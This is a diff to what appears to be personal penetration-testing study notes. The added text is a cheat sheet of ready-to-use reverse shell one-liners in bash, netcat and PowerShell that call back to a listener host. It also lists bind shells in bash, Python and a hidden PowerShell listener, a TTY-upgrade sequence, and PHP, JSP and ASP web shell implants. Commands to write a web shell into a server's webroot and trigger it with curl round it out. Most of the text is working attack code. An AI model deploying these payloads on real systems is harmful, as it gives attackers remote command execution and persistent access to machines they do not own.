@@ -140,4 +140,101 @@ shell (get interactive shell)
 ```
 
 ###### Types of Shells
-**Reverse Shell** - Sends a shell back to a listener port
+**Reverse Shell** - Sends a shell from a target host back to a listener port on the local host. Easy reliable.
+Types(call back):
+**Bash**
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+```
+**Bash**
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+```
+**Powershell**
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+**Netcat listener**
+```bash
+nc -lvpn 4444
+```
+-l - listen for a connection
+-v - verbose mode
+-n - disable dns resolution only connect from IPs
+-p - define the port you want active connection on
+
+**Bind Shell** - Listens on an open port to catch an incoming connection. Like your binding bash to listen on x port, and when it recieves a connection that port will open a shell session for the target host. Pros is once its setup the port is open its reliable and if you lose connection you can connect right back.
+Types(Listen for incoming):
+**Bash**
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+```
+**Python**
+```python
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+**Powershell**
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+```
+**Connect to Bindshell via NC**
+```bash
+nc 10.10.10.1 1234
+```
+**Upgrade TTY**
+```python
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+Then run ctrl+z
+Then run in terminal:
+```bash 
+stty raw -echo
+fg
+```
+After that you should have an upgraded shell where you can use all the normal shell operations.
+
+**Web Shell** - Web shell typically is getting a shell onto a web sever, and interacting with that shell via web requests to the server. The commands will be part of the searched url string, and the outputs will be logged in messages from the web server.
+**Types of webshell implants:**
+**php**
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+**jsp**
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+**asp**
+```asp
+<% eval request("cmd") %>
+```
+These typically need to be uploaded to a websevers webroot directory and execute them through the web browser. These are the common webroot default directories.
+
+Web Server - Apache
+```
+/var/www/html/
+```
+Web Server - Nginx
+```
+/usr/local/nginx/html/
+```
+Web Server - IIS
+```c:\inetpub\wwwroot\
+
+```
+Web Server - XAMPP
+```
+C:\xampp\htdocs\
+```
+The command to write a webshell to one of these diretories is very straight forward, however it may need to be url encoded.
+Examples:
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+```bash
+curl http://SERVER_IP:PORT/shell.php?cmd=id
+```
+
+**Find local ip** - to list your local ip and interfaces just run ip -a, ifconfig, or ipconfig.
+```bash
+ip a
+```
